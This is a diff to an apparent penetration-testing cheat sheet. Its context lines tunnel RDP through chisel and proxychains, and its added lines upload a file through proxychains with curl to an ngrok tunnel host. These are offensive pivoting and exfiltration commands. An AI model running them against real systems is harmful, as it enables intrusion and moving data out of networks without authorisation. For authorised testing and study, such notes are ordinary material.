@@ -191,6 +191,10 @@ RDP externally :
 5 - from new terminal --> chisel server -p <forwarded port 4444> --reverse
 6 - proxychains4 xfreerdp /u:<user> /v:<local ip> /p:<password>
 ---------------------------------------------------------------------------------------------------------------
+Transfer file using curl externally :
+proxychains4 python file_upload_server.py <forwarded port 4444>
+curl -F "files=@<os.exe>" http://<4.tcp.eu.ngrok.io>:<15881>
+---------------------------------------------------------------------------------------------------------------
 
 
 
